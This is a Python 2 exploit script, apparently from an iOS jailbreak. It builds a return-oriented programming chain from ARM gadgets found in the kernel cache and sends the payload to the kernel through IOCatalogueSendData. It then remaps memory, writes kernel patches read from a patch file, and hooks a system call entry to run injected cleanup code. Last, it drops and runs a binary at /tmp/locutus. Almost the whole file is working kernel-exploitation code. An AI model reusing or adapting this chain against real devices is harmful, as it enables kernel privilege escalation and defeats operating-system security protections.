#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib
import dmini
from world1 import *
import goo

if len(sys.argv) != 4:
    print >> sys.stderr, "usage: python catalog.py '-c cache' '-k kern' patchfile"
    sys.exit(1)

patchfile = open(sys.argv[3])

def read(f, size):
    result = f.read(size)
    if len(result) != size: raise Exception('truncated')
    return result

def omgresult():
    result, resultp = stackunkpair()
    store_r0_to(resultp)
    funcall('_printf', ptr('Result was %08x\n', True), result)

dmini.init(shlex.split(sys.argv[2]))

# mcr p15, 0, r0, c3, c0, 0; bx lr
mcrdude = dmini.cur.find_basic('- 10 0f 03 ee 1e ff 2f e1') + 0
# sub sp, r7, #20; pop {r8, r10}; pop {r4-r7, pc}
popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')


dmini.init(shlex.split(sys.argv[1]))

ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
#print hex(ldm), hex(stub), num_before_r0, num_after_r0

kernstuff = ([dontcare] * num_before_r0) + [0xffffffff] + ([dontcare] * num_after_r0) + [popdude, mcrdude]
kernstuff = struct.pack('I'*len(kernstuff), *kernstuff)

kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))

plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)

init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')

# btw
locutus_len = os.path.getsize('../../locutus/locutus')

# r0 came from stub.py
out_sp, out_spp = stackunkpair()
locutus, locutusp = stackunkpair()
store_r0_to(out_spp)
add_r0_by(0x558 - 0x624) # subrs, minus the offset we already added :psyduck:
load_r0_r0()
store_r0_to(locutusp)

# before we remap, save 0x1000 so we can have it back

# we want to remap 
# find_kernel_ldm -> 0
# stub & ~0xfff -> 0x1000

funcall('_mach_task_self')
mtss = []
for i in xrange(9):
    mts, mtsp = stackunkpair()
    store_r0_to(mtsp)
    mtss.append(mts)

sizep = ptrI(0x1000)
memory_entry, memory_entryp = stackunkpair()
funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0)

protp = ptrI(0)
zerop = ptrI(0)
thousandp = ptrI(0x1000)
funcall('_vm_deallocate', mtss.pop(), 0, 0x2000)
funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm, 0, protp, protp, 2) 
funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2)
funcall('_mlock', 0, 0x2000)
funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX

plist = 'x'

#funcall('_abort')
dmini.cur.choose_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
funcall('_IOCatalogueSendData', 0, 1, ptr(plist), len(plist))

dmini.cur.choose_file('/usr/lib/libSystem.B.dylib')
#funcall('_strcpy', 0x801f2c84, ptr('You just lost the game.', True))
#funcall('_printf', ptr('If this works, you won: %s\n', True), 0x801f2c84)
#funcall('_exit', 0)

while True:
    namelen = patchfile.read(4)
    if len(namelen) == 0: break
    if len(namelen) != 4: raise Exception('truncated')
    name = read(patchfile, struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', read(patchfile, 4))
    data = read(patchfile, struct.unpack('I', read(patchfile, 4))[0])
    #print repr(name), hex(addr), data.encode('hex')
    if name == 'sysent patch':
        sysent_patch, = struct.unpack('I', data)
    elif name == 'sysent patch orig':
        sysent_patch_orig, = struct.unpack('I', data)
    elif name == 'scratch':
        scratch, = struct.unpack('I', data)
    if addr == 0 or name.startswith('+'): # in place only
        continue
    if len(data) == 4:
        store_val_to(struct.unpack('I', data)[0], addr)
    else:
        funcall('_memcpy', addr, ptr(data), len(data))

# cleanup with a syscall
# mov r0, 1; mcr p15, 0, r0, c3, c0, 0; ldr r0, a; ldr r1, b; str r0, [r1]; mov r0, #0; bx lr
cleaner = [0xe3a00001, 0xee030f10, 0xe59f000c, 0xe59f100c, 0xe5810000, 0xe3a00000, 0xe12fff1e, sysent_patch_orig, sysent_patch]
funcall('_memcpy', scratch, ptrI(*cleaner), 4 * len(cleaner))
store_val_to(scratch, sysent_patch)
funcall('_syscall', 0)

# we're back in sanity land, do some housekeeping
funcall('_munlock', 0, 0x2000)
funcall('_vm_deallocate', mtss.pop(), 0, 0x2000)
funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0)
funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0)
funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2)

O_WRONLY = 0x0001
O_CREAT  = 0x0200
O_TRUNC  = 0x0400

locutus_str = ptr('/tmp/locutus', True)
funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
fd, fdp = stackunkpair()
store_r0_to(fdp)
funcall('_write', None, locutus, locutus_len)
funcall('_close', fd)
funcall('_execl', locutus_str, locutus_str, 0)

fancy_set_sp_to(out_sp)

final = finalize(0x11000000)

#final = zlib.compress(final)
#heapdump(None)
open('output.txt', 'w').write(final)

